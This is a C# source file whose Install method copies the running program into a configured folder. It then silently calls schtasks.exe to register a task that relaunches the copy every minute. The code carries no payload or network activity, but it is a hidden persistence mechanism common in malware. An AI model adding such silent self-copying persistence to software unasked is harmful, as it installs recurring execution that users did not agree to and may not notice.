
using System.Diagnostics;

namespace stms;

public class Installation
{
    public static void Install()
    {
        try
        {
            string exePath = Path.Combine(Config.file_path, "stms.exe");

            if (!Directory.Exists(Config.file_path))
                Directory.CreateDirectory(Config.file_path);

            File.Copy(Environment.ProcessPath, exePath);

            if (string.IsNullOrWhiteSpace(Config.task_name))
                throw new ArgumentException("Empty task name!");

            string arguments;
            if (string.IsNullOrWhiteSpace(exePath))
                throw new ArgumentException("Empty exePath!");

            string actionCommand = $"\\\"{exePath}\\\" --start";
            arguments = $"/Create /TN \"{Config.task_name}\" /TR \"{actionCommand}\" /SC MINUTE /MO 1 /RL LIMITED /F";

            using var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = arguments,
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true
                }
            };

            process.Start();
            process.WaitForExit();
        }
        catch
        {
            throw;
        }
    }
}